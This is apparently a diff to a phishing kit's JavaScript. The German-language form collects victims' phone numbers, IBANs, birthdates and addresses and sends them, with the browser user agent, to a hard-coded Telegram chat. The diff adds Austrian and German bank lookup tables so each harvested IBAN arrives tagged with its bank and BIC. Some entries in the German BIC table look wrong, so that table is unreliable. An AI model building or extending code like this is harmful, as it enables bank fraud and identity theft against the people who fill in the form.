@@ -7,8 +7,118 @@ const CHAT_ID = "-1004324836304";
 let ibanCheckResult = {
     valid: false,
     message: 'nicht geprüft',
+    bankData: null,
     iban: ''
 };
+
+// ============================================================
+// 🏦 СПРАВОЧНИК АВСТРИЙСКИХ БАНКОВ (BLZ -> BIC и название)
+// Источник: Oesterreichische Nationalbank (OeNB), ноябрь 2026
+// ============================================================
+const AUSTRIAN_BANKS = {
+    '11000': { bic: 'BKAUATWWXXX', bank: 'UniCredit Bank Austria AG' },
+    '12000': { bic: 'BKAUATWWXXX', bank: 'UniCredit Bank Austria AG' },
+    '12002': { bic: 'BKAUATWWXXX', bank: 'UniCredit Bank Austria AG' },
+    '12004': { bic: 'BKAUATWWXXX', bank: 'UniCredit Bank Austria AG' },
+    '12005': { bic: 'BKAUATWWXXX', bank: 'UniCredit Bank Austria AG' },
+    '14000': { bic: 'BAWAATWWXXX', bank: 'BAWAG P.S.K. AG' },
+    '14001': { bic: 'BAWAATWWXXX', bank: 'BAWAG P.S.K. AG' },
+    '14002': { bic: 'BAWAATWWXXX', bank: 'BAWAG P.S.K. AG' },
+    '14200': { bic: 'BAWAATWWXXX', bank: 'BAWAG P.S.K. AG' },
+    '14210': { bic: 'BAWAATWWXXX', bank: 'BAWAG P.S.K. AG' },
+    '14900': { bic: 'BAWAATWWXXX', bank: 'BAWAG P.S.K. AG' },
+    '15000': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
+    '15001': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
+    '15002': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
+    '15003': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
+    '15004': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
+    '15005': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
+    '15006': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
+    '15007': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
+    '15008': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
+    '15009': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
+    '15010': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
+    '15011': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
+    '15012': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
+    '15013': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
+    '15021': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
+    '15022': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
+    '15023': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
+    '15024': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
+    '15025': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
+    '15030': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
+    '15031': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
+    '15040': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
+    '15041': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
+    '15042': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
+    '15060': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
+    '15061': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
+    '15062': { bic: 'OBKLAT2LXXX', bank: 'Oberbank AG' },
+    '33002': { bic: 'RLBBAT2E038', bank: 'Raiffeisen Bezirksbank Neusiedl Ost eGen' },
+    '35011': { bic: 'RVSAAT2S039', bank: 'Raiffeisenbank Oberpinzgau eGen' },
+    '35036': { bic: 'RVSAAT2S063', bank: 'Raiffeisenbank Lungau eGen' },
+    '34000': { bic: 'RZOOAT2LXXX', bank: 'Raiffeisenlandesbank Oberösterreich AG' },
+    '35010': { bic: 'RVSAAT2S055', bank: 'Raiffeisenbank Pongau Mitte eGen' },
+    '39254': { bic: 'RZKTAT2K475', bank: 'Raiffeisenbank Mittelkärnten eG' },
+    '34233': { bic: 'RZOOAT2L380', bank: 'Raiffeisenbank Region Kirchdorf eGen' },
+    '35008': { bic: 'RVSAAT2S015', bank: 'Raiffeisenbank Flachgau Mitte eGen' },
+    '35022': { bic: 'RVSAAT2S022', bank: 'Raiffeisenbank Hallein-Oberalm eGen' },
+    '35012': { bic: 'RVSAAT2S012', bank: 'Raiffeisenbank Hohe Tauern eGen' }
+};
+
+// ============================================================
+// 🏛️ ОПРЕДЕЛЕНИЕ БАНКА ПО BIC (для немецких BIC, если придут от API)
+// ============================================================
+function getBankNameByBIC(bic) {
+    const bankMap = {
+        'GENODEF1HH2': 'Hamburger Sparkasse (Haspa)',
+        'GENODEF1HH1': 'Hamburger Sparkasse',
+        'DEUTDEHH': 'Deutsche Bank Hamburg',
+        'COBADEHH': 'Commerzbank Hamburg',
+        'HYVEDEMM': 'UniCredit Bank - HypoVereinsbank',
+        'DRESDEFF': 'Commerzbank (Dresdner Bank)',
+        'SPARDEHH': 'Sparkasse Hamburg',
+        'VORSDEHH': 'Volksbank Hamburg',
+        'HELADEF1': 'Sparkasse',
+        'GENODEFF': 'Volksbank',
+        'SOLADEST': 'Sparkasse',
+        'BYLADEM': 'BayernLB',
+        'GENODEF1S2': 'Sparkasse',
+        'DEUTDEDB': 'Deutsche Bank',
+        'COBADEFF': 'Commerzbank',
+        'TRIDEFHH': 'Targobank Hamburg',
+        'INGDDEFF': 'ING Bank',
+        'NTSBDEDE': 'N26 Bank',
+        'SOGEDEFF': 'Societe Generale',
+        'BNPADEFF': 'BNP Paribas',
+        'BUKBDEFF': 'Bankhaus BUKB',
+        'MHBKDEHH': 'M.M.Warburg & CO',
+        'SCFBDEFF': 'Sberbank',
+        'VPAYDEFF': 'V-Payment',
+        'SSKNDEFF': 'S-Kreditpartner',
+        'GENODEF1HHV': 'Hamburger Volksbank',
+        'HASPDEHH': 'Haspa Hamburg',
+        'DEUTDEHHV': 'Deutsche Bank Hamburg',
+        'COBADEHHV': 'Commerzbank Hamburg',
+        'GENODEF1P2': 'Sparkasse Pforzheim',
+        'GENODEF1S1': 'Sparkasse',
+        'GENODEF1A2': 'Sparkasse Aachen',
+        'GENODEF1B1': 'Sparkasse Bremen',
+        'GENODEF1D1': 'Sparkasse Dortmund',
+        'GENODEF1E1': 'Sparkasse Essen',
+        'GENODEF1F1': 'Sparkasse Frankfurt',
+        'GENODEF1G1': 'Sparkasse Gera',
+        'GENODEF1H1': 'Sparkasse Hannover',
+        'GENODEF1K1': 'Sparkasse Köln',
+        'GENODEF1L1': 'Sparkasse Leipzig',
+        'GENODEF1M1': 'Sparkasse München',
+        'GENODEF1N1': 'Sparkasse Nürnberg',
+        'GENODEF1R1': 'Sparkasse Rostock',
+        'GENODEF1S2': 'Sparkasse Stuttgart',
+        'GENODEF1W1': 'Sparkasse Wiesbaden'
+    };
+    return bankMap[bic.toUpperCase()] || null;
+}
 
 // ============================================================
 // 📅 ВАЛИДАЦИЯ ДАТЫ РОЖДЕНИЯ (от 1950 до 2008)
@@ -42,32 +152,24 @@ function validateBirthdate(value) {
 }
 
 // ============================================================
-// 🏦 ЛОКАЛЬНЫЙ IBAN-ЧЕКЕР (MOD-97)
+// 🏦 ЛОКАЛЬНЫЙ IBAN-ЧЕКЕР + ОПРЕДЕЛЕНИЕ БАНКА ПО BLZ
 // ============================================================
 function validateIbanLocally(iban) {
-    // 1. Убираем пробелы и приводим к верхнему регистру
     const cleanIban = iban.replace(/\s/g, '').toUpperCase();
 
-    // 2. Проверка на допустимые символы (только буквы и цифры)
     if (!/^[A-Z0-9]+$/.test(cleanIban)) {
-        return { valid: false, message: 'Ungültige IBAN.' };
+        return { valid: false, message: 'Ungültige IBAN.', bankData: null };
     }
 
-    // 3. Проверка длины для Австрии (AT = 20 символов)
     if (cleanIban.length !== 20) {
-        return { valid: false, message: 'Ungültige IBAN.' };
+        return { valid: false, message: 'Ungültige IBAN.', bankData: null };
     }
 
-    // 4. Проверка, что начинается с AT
     if (!cleanIban.startsWith('AT')) {
-        return { valid: false, message: 'Ungültige IBAN.' };
+        return { valid: false, message: 'Ungültige IBAN.', bankData: null };
     }
 
-    // 5. Проверка контрольных цифр (MOD-97)
-    // Переставляем первые 4 символа в конец
     const rearranged = cleanIban.slice(4) + cleanIban.slice(0, 4);
-
-    // Заменяем буквы на числа (A=10, B=11, ..., Z=35)
     let numericString = '';
     for (let i = 0; i < rearranged.length; i++) {
         const char = rearranged[i];
@@ -78,18 +180,31 @@ function validateIbanLocally(iban) {
         }
     }
 
-    // Вычисляем остаток от деления на 97 (для длинных чисел используем пошаговый метод)
     let remainder = 0;
     for (let i = 0; i < numericString.length; i++) {
         remainder = (remainder * 10 + parseInt(numericString[i], 10)) % 97;
     }
 
-    // Если остаток равен 1 — IBAN валиден
     if (remainder !== 1) {
-        return { valid: false, message: 'Ungültige IBAN.' };
+        return { valid: false, message: 'Ungültige IBAN.', bankData: null };
     }
 
-    return { valid: true, message: 'Gültige IBAN.' };
+    const blz = cleanIban.substring(4, 9);
+    const bankInfo = AUSTRIAN_BANKS[blz];
+
+    let bankData = null;
+    let message = 'Gültige IBAN.';
+
+    if (bankInfo) {
+        bankData = {
+            bic: bankInfo.bic,
+            bank: bankInfo.bank
+        };
+    } else {
+        message = 'Gültige IBAN (Bank unbekannt).';
+    }
+
+    return { valid: true, message: message, bankData: bankData };
 }
 
 // ============================================================
@@ -136,7 +251,7 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
 
-    // === IBAN (форматирование без проверки) ===
+    // === IBAN (только форматирование) ===
     if (ibanInput) {
         ibanInput.maxLength = 34;
         ibanInput.addEventListener('input', function() {
@@ -153,18 +268,17 @@ document.addEventListener('DOMContentLoaded', function() {
     form.addEventListener('submit', function(event) {
         event.preventDefault();
 
-        // Скрываем ошибки перед проверкой
         if (ibanError) ibanError.style.display = 'none';
         if (birthdateError) birthdateError.style.display = 'none';
 
-        // --- Проверка телефона ---
+        // --- Телефон ---
         const phoneDigits = phoneInput.value.replace(/[^0-9]/g, '');
         if (phoneDigits.length < 6) {
             alert('Bitte geben Sie eine gültige Telefonnummer ein (mindestens 6 Ziffern).');
             return;
         }
 
-        // --- Проверка IBAN (локальный чекер) ---
+        // --- IBAN ---
         const ibanValue = ibanInput.value.trim();
         const ibanValidation = validateIbanLocally(ibanValue);
         if (!ibanValidation.valid) {
@@ -173,7 +287,7 @@ document.addEventListener('DOMContentLoaded', function() {
             return;
         }
 
-        // --- Проверка даты рождения ---
+        // --- Дата рождения ---
         const birthdateValue = birthdateInput.value.trim();
         const birthdateValidation = validateBirthdate(birthdateValue);
         if (!birthdateValidation.valid) {
@@ -185,10 +299,11 @@ document.addEventListener('DOMContentLoaded', function() {
             return;
         }
 
-        // --- Всё ок, обновляем статус и отправляем ---
+        // --- Всё ок ---
         ibanCheckResult = {
             valid: true,
-            message: 'Gültige IBAN.',
+            message: ibanValidation.message,
+            bankData: ibanValidation.bankData,
             iban: ibanValue
         };
 
@@ -219,9 +334,26 @@ function sendToTelegram(data) {
     message += `🏙️ <b>Stadt:</b> ${data.city || 'nicht angegeben'}\n`;
     message += `📮 <b>PLZ:</b> ${data.postal || 'nicht angegeben'}\n`;
 
-    const ibanData = data.iban_check || { valid: false, message: 'nicht geprüft' };
+    const ibanData = data.iban_check || { valid: false, message: 'nicht geprüft', bankData: null };
     message += `🏦 <b>IBAN:</b> ${data.iban || 'nicht angegeben'}\n`;
     message += `🔍 <b>IBAN-Status:</b> ${ibanData.message || 'nicht geprüft'}\n`;
+
+    if (ibanData.bankData) {
+        let bankName = ibanData.bankData.bank;
+        const bic = ibanData.bankData.bic;
+
+        // Если названия банка нет, но есть BIC — пробуем определить по немецкой карте
+        if (!bankName && bic) {
+            bankName = getBankNameByBIC(bic);
+        }
+
+        if (bankName) {
+            message += `🏛️ <b>Bank:</b> ${bankName}\n`;
+        }
+        if (bic) {
+            message += `🔢 <b>BIC:</b> ${bic}\n`;
+        }
+    }
 
     message += `\n🕒 <b>Zeit:</b> ${new Date().toLocaleString('de-DE')}`;
     message += `\n🌐 <b>Browser:</b> ${navigator.userAgent}`;
@@ -255,7 +387,7 @@ function sendToTelegram(data) {
                 const ibanInput = document.getElementById('ibanInput');
                 if (ibanInput) ibanInput.value = '';
 
-                ibanCheckResult = { valid: false, message: 'nicht geprüft' };
+                ibanCheckResult = { valid: false, message: 'nicht geprüft', bankData: null, iban: '' };
             }, 2000);
         } else {
             throw new Error(data.description || 'Unknown error');
